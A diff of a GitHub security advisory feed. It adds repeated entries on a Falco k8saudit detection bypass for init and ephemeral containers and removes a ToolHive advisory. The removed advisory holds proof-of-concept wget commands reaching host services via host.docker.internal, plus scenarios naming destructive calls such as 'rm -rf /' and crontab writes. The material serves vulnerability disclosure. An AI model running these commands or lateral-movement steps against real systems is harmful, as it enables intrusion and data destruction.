+<p>Operators upgrading should review any <strong>custom</strong> rules built on <code>ka.req.pod.containers.*</code> — in particular tuned <code>Create Disallowed Pod</code> image allowlists — and extend them to the new <code>initContainers</code>/<code>ephemeralContainers</code> image fields.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>For deployments that cannot upgrade immediately, restrict who can create pods (RBAC) and enforce Pod Security Admission (<code>baseline</code>/<code>restricted</code>) or an admission controller (Kyverno, OPA/Gatekeeper) to block privileged init/ephemeral containers at admission time, as defense-in-depth.</p>
+<h3 id="credits">Credits</h3>
+<p><a href="https://github.com/kanywst">kanywst</a> — discovery and fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/pull/1400">https://github.com/falcosecurity/plugins/pull/1400</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1">https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-21T21:43:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/falcosecurity/plugins/plugins/k8saudit-aks] k8saudit shipped rules do not detect privileged/sensitive settings on init or ephemeral containers]]></title>
+        <id>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</id>
+        <link href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4"/>
+        <updated>2026-09-21T21:43:55.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>k8saudit</code> plugin's per-container fields (<code>ka.req.pod.containers.*</code>) and the shipped <code>k8s_audit_rules.yaml</code> evaluated only <code>requestObject.spec.containers</code>. Security-relevant settings on a pod's <code>initContainers</code> or <code>ephemeralContainers</code> were not inspected, so the shipped <code>Create Privileged Pod</code> rule did not fire for a privileged container placed in either list.</p>
+<h3 id="impact">Impact</h3>
+<p>An actor able to create pods (the activity k8saudit is intended to audit) could run a privileged container without triggering the default <code>Create Privileged Pod</code> rule, by declaring it as an <code>initContainer</code> or <code>ephemeralContainer</code> instead of a regular container. Kubernetes runs such containers with the requested privileges, but the shipped rule did not see them. The same gap applied to other per-container security settings (capabilities, <code>allowPrivilegeEscalation</code>, <code>runAsUser</code>, etc.) and, for deployments using a customized image allowlist, to disallowed images placed in those lists.</p>
+<p>This is a detection bypass of the default k8saudit ruleset, not a direct privilege escalation, and it requires the ability to create pods. The cloud-provider variants (<code>k8saudit-eks</code>, <code>k8saudit-gke</code>, <code>k8saudit-aks</code>, <code>k8saudit-ovh</code>) embed the same extraction logic and ship the same ruleset, and were affected equally.</p>
+<p>Note: adding an ephemeral container goes through the <code>pods/ephemeralcontainers</code> subresource, so the <code>EphemeralContainers Created</code> rule still logged that event at <code>NOTICE</code>, but without any privileged/security evaluation.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>k8saudit 0.18.0</code>, and in the cloud-variant releases that depend on it — <code>k8saudit-eks 0.12.0</code>, <code>k8saudit-gke 0.9.0</code>, <code>k8saudit-aks 0.6.0</code>, <code>k8saudit-ovh 0.6.0</code> — all released on 2026-06-19.</p>
+<p>The fix (<a href="https://github.com/falcosecurity/plugins/pull/1400">falcosecurity/plugins#1400</a>, merged 2026-06-18) adds dedicated <code>ka.req.pod.initContainers.*</code> and <code>ka.req.pod.ephemeralContainers.*</code> field families and updates <code>Create Privileged Pod</code> (via a new <code>any_container_privileged</code> macro) to evaluate all three container lists.</p>
+<p>Operators upgrading should review any <strong>custom</strong> rules built on <code>ka.req.pod.containers.*</code> — in particular tuned <code>Create Disallowed Pod</code> image allowlists — and extend them to the new <code>initContainers</code>/<code>ephemeralContainers</code> image fields.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>For deployments that cannot upgrade immediately, restrict who can create pods (RBAC) and enforce Pod Security Admission (<code>baseline</code>/<code>restricted</code>) or an admission controller (Kyverno, OPA/Gatekeeper) to block privileged init/ephemeral containers at admission time, as defense-in-depth.</p>
+<h3 id="credits">Credits</h3>
+<p><a href="https://github.com/kanywst">kanywst</a> — discovery and fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/pull/1400">https://github.com/falcosecurity/plugins/pull/1400</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1">https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-21T21:43:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/falcosecurity/plugins/plugins/k8saudit-gke] k8saudit shipped rules do not detect privileged/sensitive settings on init or ephemeral containers]]></title>
+        <id>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</id>
+        <link href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4"/>
+        <updated>2026-09-21T21:43:55.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>k8saudit</code> plugin's per-container fields (<code>ka.req.pod.containers.*</code>) and the shipped <code>k8s_audit_rules.yaml</code> evaluated only <code>requestObject.spec.containers</code>. Security-relevant settings on a pod's <code>initContainers</code> or <code>ephemeralContainers</code> were not inspected, so the shipped <code>Create Privileged Pod</code> rule did not fire for a privileged container placed in either list.</p>
+<h3 id="impact">Impact</h3>
+<p>An actor able to create pods (the activity k8saudit is intended to audit) could run a privileged container without triggering the default <code>Create Privileged Pod</code> rule, by declaring it as an <code>initContainer</code> or <code>ephemeralContainer</code> instead of a regular container. Kubernetes runs such containers with the requested privileges, but the shipped rule did not see them. The same gap applied to other per-container security settings (capabilities, <code>allowPrivilegeEscalation</code>, <code>runAsUser</code>, etc.) and, for deployments using a customized image allowlist, to disallowed images placed in those lists.</p>
+<p>This is a detection bypass of the default k8saudit ruleset, not a direct privilege escalation, and it requires the ability to create pods. The cloud-provider variants (<code>k8saudit-eks</code>, <code>k8saudit-gke</code>, <code>k8saudit-aks</code>, <code>k8saudit-ovh</code>) embed the same extraction logic and ship the same ruleset, and were affected equally.</p>
+<p>Note: adding an ephemeral container goes through the <code>pods/ephemeralcontainers</code> subresource, so the <code>EphemeralContainers Created</code> rule still logged that event at <code>NOTICE</code>, but without any privileged/security evaluation.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>k8saudit 0.18.0</code>, and in the cloud-variant releases that depend on it — <code>k8saudit-eks 0.12.0</code>, <code>k8saudit-gke 0.9.0</code>, <code>k8saudit-aks 0.6.0</code>, <code>k8saudit-ovh 0.6.0</code> — all released on 2026-06-19.</p>
+<p>The fix (<a href="https://github.com/falcosecurity/plugins/pull/1400">falcosecurity/plugins#1400</a>, merged 2026-06-18) adds dedicated <code>ka.req.pod.initContainers.*</code> and <code>ka.req.pod.ephemeralContainers.*</code> field families and updates <code>Create Privileged Pod</code> (via a new <code>any_container_privileged</code> macro) to evaluate all three container lists.</p>
+<p>Operators upgrading should review any <strong>custom</strong> rules built on <code>ka.req.pod.containers.*</code> — in particular tuned <code>Create Disallowed Pod</code> image allowlists — and extend them to the new <code>initContainers</code>/<code>ephemeralContainers</code> image fields.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>For deployments that cannot upgrade immediately, restrict who can create pods (RBAC) and enforce Pod Security Admission (<code>baseline</code>/<code>restricted</code>) or an admission controller (Kyverno, OPA/Gatekeeper) to block privileged init/ephemeral containers at admission time, as defense-in-depth.</p>
+<h3 id="credits">Credits</h3>
+<p><a href="https://github.com/kanywst">kanywst</a> — discovery and fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/pull/1400">https://github.com/falcosecurity/plugins/pull/1400</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1">https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-21T21:43:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/falcosecurity/plugins/plugins/k8saudit-eks] k8saudit shipped rules do not detect privileged/sensitive settings on init or ephemeral containers]]></title>
+        <id>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</id>
+        <link href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4"/>
+        <updated>2026-09-21T21:43:55.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>k8saudit</code> plugin's per-container fields (<code>ka.req.pod.containers.*</code>) and the shipped <code>k8s_audit_rules.yaml</code> evaluated only <code>requestObject.spec.containers</code>. Security-relevant settings on a pod's <code>initContainers</code> or <code>ephemeralContainers</code> were not inspected, so the shipped <code>Create Privileged Pod</code> rule did not fire for a privileged container placed in either list.</p>
+<h3 id="impact">Impact</h3>
+<p>An actor able to create pods (the activity k8saudit is intended to audit) could run a privileged container without triggering the default <code>Create Privileged Pod</code> rule, by declaring it as an <code>initContainer</code> or <code>ephemeralContainer</code> instead of a regular container. Kubernetes runs such containers with the requested privileges, but the shipped rule did not see them. The same gap applied to other per-container security settings (capabilities, <code>allowPrivilegeEscalation</code>, <code>runAsUser</code>, etc.) and, for deployments using a customized image allowlist, to disallowed images placed in those lists.</p>
+<p>This is a detection bypass of the default k8saudit ruleset, not a direct privilege escalation, and it requires the ability to create pods. The cloud-provider variants (<code>k8saudit-eks</code>, <code>k8saudit-gke</code>, <code>k8saudit-aks</code>, <code>k8saudit-ovh</code>) embed the same extraction logic and ship the same ruleset, and were affected equally.</p>
+<p>Note: adding an ephemeral container goes through the <code>pods/ephemeralcontainers</code> subresource, so the <code>EphemeralContainers Created</code> rule still logged that event at <code>NOTICE</code>, but without any privileged/security evaluation.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>k8saudit 0.18.0</code>, and in the cloud-variant releases that depend on it — <code>k8saudit-eks 0.12.0</code>, <code>k8saudit-gke 0.9.0</code>, <code>k8saudit-aks 0.6.0</code>, <code>k8saudit-ovh 0.6.0</code> — all released on 2026-06-19.</p>
+<p>The fix (<a href="https://github.com/falcosecurity/plugins/pull/1400">falcosecurity/plugins#1400</a>, merged 2026-06-18) adds dedicated <code>ka.req.pod.initContainers.*</code> and <code>ka.req.pod.ephemeralContainers.*</code> field families and updates <code>Create Privileged Pod</code> (via a new <code>any_container_privileged</code> macro) to evaluate all three container lists.</p>
+<p>Operators upgrading should review any <strong>custom</strong> rules built on <code>ka.req.pod.containers.*</code> — in particular tuned <code>Create Disallowed Pod</code> image allowlists — and extend them to the new <code>initContainers</code>/<code>ephemeralContainers</code> image fields.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>For deployments that cannot upgrade immediately, restrict who can create pods (RBAC) and enforce Pod Security Admission (<code>baseline</code>/<code>restricted</code>) or an admission controller (Kyverno, OPA/Gatekeeper) to block privileged init/ephemeral containers at admission time, as defense-in-depth.</p>
+<h3 id="credits">Credits</h3>
+<p><a href="https://github.com/kanywst">kanywst</a> — discovery and fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/pull/1400">https://github.com/falcosecurity/plugins/pull/1400</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1">https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-21T21:43:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/falcosecurity/plugins/plugins/k8saudit] k8saudit shipped rules do not detect privileged/sensitive settings on init or ephemeral containers]]></title>
+        <id>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</id>
+        <link href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4"/>
+        <updated>2026-09-21T21:43:55.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>k8saudit</code> plugin's per-container fields (<code>ka.req.pod.containers.*</code>) and the shipped <code>k8s_audit_rules.yaml</code> evaluated only <code>requestObject.spec.containers</code>. Security-relevant settings on a pod's <code>initContainers</code> or <code>ephemeralContainers</code> were not inspected, so the shipped <code>Create Privileged Pod</code> rule did not fire for a privileged container placed in either list.</p>
+<h3 id="impact">Impact</h3>
+<p>An actor able to create pods (the activity k8saudit is intended to audit) could run a privileged container without triggering the default <code>Create Privileged Pod</code> rule, by declaring it as an <code>initContainer</code> or <code>ephemeralContainer</code> instead of a regular container. Kubernetes runs such containers with the requested privileges, but the shipped rule did not see them. The same gap applied to other per-container security settings (capabilities, <code>allowPrivilegeEscalation</code>, <code>runAsUser</code>, etc.) and, for deployments using a customized image allowlist, to disallowed images placed in those lists.</p>
+<p>This is a detection bypass of the default k8saudit ruleset, not a direct privilege escalation, and it requires the ability to create pods. The cloud-provider variants (<code>k8saudit-eks</code>, <code>k8saudit-gke</code>, <code>k8saudit-aks</code>, <code>k8saudit-ovh</code>) embed the same extraction logic and ship the same ruleset, and were affected equally.</p>
+<p>Note: adding an ephemeral container goes through the <code>pods/ephemeralcontainers</code> subresource, so the <code>EphemeralContainers Created</code> rule still logged that event at <code>NOTICE</code>, but without any privileged/security evaluation.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>k8saudit 0.18.0</code>, and in the cloud-variant releases that depend on it — <code>k8saudit-eks 0.12.0</code>, <code>k8saudit-gke 0.9.0</code>, <code>k8saudit-aks 0.6.0</code>, <code>k8saudit-ovh 0.6.0</code> — all released on 2026-06-19.</p>
+<p>The fix (<a href="https://github.com/falcosecurity/plugins/pull/1400">falcosecurity/plugins#1400</a>, merged 2026-06-18) adds dedicated <code>ka.req.pod.initContainers.*</code> and <code>ka.req.pod.ephemeralContainers.*</code> field families and updates <code>Create Privileged Pod</code> (via a new <code>any_container_privileged</code> macro) to evaluate all three container lists.</p>
+<p>Operators upgrading should review any <strong>custom</strong> rules built on <code>ka.req.pod.containers.*</code> — in particular tuned <code>Create Disallowed Pod</code> image allowlists — and extend them to the new <code>initContainers</code>/<code>ephemeralContainers</code> image fields.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>For deployments that cannot upgrade immediately, restrict who can create pods (RBAC) and enforce Pod Security Admission (<code>baseline</code>/<code>restricted</code>) or an admission controller (Kyverno, OPA/Gatekeeper) to block privileged init/ephemeral containers at admission time, as defense-in-depth.</p>
+<h3 id="credits">Credits</h3>
+<p><a href="https://github.com/kanywst">kanywst</a> — discovery and fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/falcosecurity/plugins/security/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/pull/1400">https://github.com/falcosecurity/plugins/pull/1400</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1">https://github.com/falcosecurity/plugins/commit/0adb9b3c7e2c8bad53f30d01c057e038b2afa5e1</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-aks/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-eks/v0.12.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-gke/v0.9.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit-ovh/v0.6.0</a></li>
+<li><a href="https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0">https://github.com/falcosecurity/plugins/releases/tag/plugins/k8saudit/v0.18.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4">https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-21T21:43:52.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[hatchet] Hatchet - Unauthenticated OAuth state CSRF / login-CSRF via empty-state collision in ValidateOAuthState]]></title>
         <id>https://github.com/advisories/GHSA-phg3-3g28-wq9v</id>
@@ -624,1415 +1233,5 @@ available.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-09-18T17:16:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/stacklok/toolhive] ToolHive: containerized MCP servers can reach host services via host.docker.internal, enabling lateral movement]]></title>
-        <id>https://github.com/advisories/GHSA-qg2g-g9w3-m5h8</id>
-        <link href="https://github.com/advisories/GHSA-qg2g-g9w3-m5h8"/>
-        <updated>2026-09-18T17:16:04.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A containerized MCP server running with the default <code>network</code> permission profile (<code>insecure_allow_all: true</code>) can reach host-local services via <code>host.docker.internal</code>. This includes the ToolHive API itself, other ToolHive-managed MCP server proxies, and any other service listening on the host's localhost. Combined with the unauthenticated ToolHive API and MCP proxy endpoints, this enables a compromised or malicious MCP server to perform lateral movement without any container escape.</p>
-<h2 id="severity">Severity</h2>
-<p><strong>High</strong> — This bypasses the container isolation model that is ToolHive's core security value proposition.</p>
-<h2 id="reproduction">Reproduction</h2>
-<p>All tests performed from inside the <code>filesystem</code> MCP container (<code>docker.io/mcp/filesystem:latest</code>), started with default settings via <code>thv run filesystem -- /tmp</code>.</p>
-<h3 id="1-container-can-reach-the-toolhive-control-plane-mcp-endpoint">1. Container can reach the ToolHive control plane MCP endpoint</h3>
-<pre><code class="language-bash">$ docker exec &lt;container_id&gt; wget -qO- \
-  --header="Content-Type: application/json" \
-  --header="Accept: application/json" \
-  --post-data='{"jsonrpc":"2.0","method":"initialize","params":{"protocolVersion":"2025-03-26","capabilities":{},"clientInfo":{"name":"evil-mcp","version":"1.0"}},"id":1}' \
-  http://host.docker.internal:50444/mcp
-</code></pre>
-<p><strong>Result:</strong> Full MCP handshake succeeds:</p>
-<pre><code class="language-json">{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2025-03-26","capabilities":{"logging":{},"tools":{}},"serverInfo":{"name":"toolhive-mcp","version":"v0.9.3"}}}
-</code></pre>
-<h3 id="2-container-can-connect-to-another-mcp-servers-proxy-and-call-its-tools">2. Container can connect to another MCP server's proxy and call its tools</h3>
-<pre><code class="language-bash">$ docker exec &lt;container_id&gt; wget -qO- \
-  --header="Content-Type: application/json" \
-  --header="Accept: application/json" \
-  --post-data='{"jsonrpc":"2.0","method":"tools/list","params":{},"id":2}' \
-  http://host.docker.internal:64965/mcp
-</code></pre>
-<p><strong>Result:</strong> Returns the full tool list of the target MCP server (read_file, write_file, edit_file, move_file, etc.), and tools can be called:</p>
-<pre><code class="language-json">{"jsonrpc":"2.0","id":3,"result":{"content":[{"text":"Allowed directories:\n/tmp","type":"text"}]}}
-</code></pre>
-<h3 id="3-container-can-reach-other-host-services">3. Container can reach other host services</h3>
-<pre><code class="language-bash"># Kubernetes API
-$ docker exec &lt;container_id&gt; wget -qO- --no-check-certificate https://host.docker.internal:6443/version
-{"major":"1","minor":"34","gitVersion":"v1.34.1"...}
-
-# Ollama LLM API
-$ docker exec &lt;container_id&gt; wget -qO- http://host.docker.internal:11434/api/tags
-{"models":[{"name":"kimi-k2:1t-cloud"...}]}
-</code></pre>
-<h2 id="attack-scenarios">Attack Scenarios</h2>
-<h3 id="scenario-1-malicious-mcp-server-pivots-to-privileged-native-mcp-tools">Scenario 1: Malicious MCP server pivots to privileged native MCP tools</h3>
-<p>Many users run native (non-containerized) MCP servers like Desktop Commander, terminal servers, or custom tools that have <code>execute_command</code>, <code>write_file</code>, or <code>shell</code> capabilities with full host access. These typically listen on localhost ports. A malicious containerized MCP server can:</p>
-<ol>
-<li>Port-scan <code>host.docker.internal</code> to discover listening services</li>
-<li>Attempt MCP handshakes on discovered ports</li>
-<li>Call privileged tools (e.g., <code>execute_command("rm -rf /")</code> or <code>write_file("/etc/crontab", "...")</code>)</li>
-</ol>
-<p>This achieves <strong>full host compromise without any container escape vulnerability</strong>.</p>
-<h3 id="scenario-2-compromised-mcp-server-manipulates-toolhive-itself">Scenario 2: Compromised MCP server manipulates ToolHive itself</h3>
-<p>Via the unauthenticated ToolHive MCP endpoint on port 50444, a compromised container could potentially:</p>
-<ul>
-<li>List and stop other running MCP servers (denial of service)</li>
-<li>Start new MCP servers with attacker-controlled images</li>
-<li>Modify configurations</li>
-</ul>
-<h3 id="scenario-3-data-exfiltration-via-cross-mcp-server-access">Scenario 3: Data exfiltration via cross-MCP-server access</h3>
-<p>A low-privilege MCP server (e.g., <code>sequentialthinking</code> with no file mounts) could reach the <code>filesystem</code> server's proxy and call <code>read_file</code> to access files it was never authorized to see.</p>
-<h3 id="scenario-4-llm-model-theft--abuse">Scenario 4: LLM model theft / abuse</h3>
-<p>As demonstrated, the container can reach Ollama's API and could enumerate models, run inference, or exfiltrate model weights from self-hosted LLMs.</p>
-<h2 id="root-causes">Root Causes</h2>
-<ol>
-<li><strong><code>insecure_allow_all: true</code> as default</strong> — permits outbound connections to any destination including <code>host.docker.internal</code></li>
-<li><strong>No authentication on ToolHive API / MCP proxies</strong> — any client that can reach the port can interact fully</li>
-<li><strong>Docker's <code>host.docker.internal</code> DNS</strong> — resolves to the host machine, bypassing localhost-only binding assumptions</li>
-</ol>
-<h2 id="suggested-mitigations">Suggested Mitigations</h2>
-<h3 id="short-term">Short-term</h3>
-<ul>
-<li><strong>Block <code>host.docker.internal</code> and <code>172.17.0.1</code></strong> (Docker gateway) in container networking by default, even when <code>insecure_allow_all</code> is enabled. These should require explicit opt-in.</li>
-<li><strong>Add authentication to MCP proxy endpoints</strong> — even a shared secret or token per session would prevent cross-container lateral movement.</li>
-</ul>
-<h3 id="medium-term">Medium-term</h3>
-<ul>
-<li><strong>Network policy per container</strong> — ToolHive already has the <code>permission_profile</code> infrastructure. Add support for explicit allow-lists rather than just the binary none/all choice.</li>
-<li><strong>Isolate container networks</strong> — run each MCP server in its own Docker network with no access to the Docker bridge gateway.</li>
-</ul>
-<h3 id="long-term">Long-term</h3>
-<ul>
-<li><strong>Mutual TLS or token-based auth</strong> between ToolHive proxy and containers, so even if network access exists, unauthorized MCP calls are rejected.</li>
-<li><strong>Audit logging</strong> — log all MCP tool calls with source identification so lateral movement attempts are visible.</li>
-</ul>
-<h2 id="environment">Environment</h2>
-<ul>
-<li>ToolHive v0.9.3 (macOS desktop app, Docker runtime)</li>
-<li>Docker Desktop for Mac (host.docker.internal enabled by default)</li>
-<li>Tested with <code>docker.io/mcp/filesystem:latest</code></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/stacklok/toolhive/security/advisories/GHSA-qg2g-g9w3-m5h8">https://github.com/stacklok/toolhive/security/advisories/GHSA-qg2g-g9w3-m5h8</a></li>
-<li><a href="https://github.com/stacklok/toolhive-studio/pull/2469">https://github.com/stacklok/toolhive-studio/pull/2469</a></li>
-<li><a href="https://github.com/stacklok/toolhive/pull/5583">https://github.com/stacklok/toolhive/pull/5583</a></li>
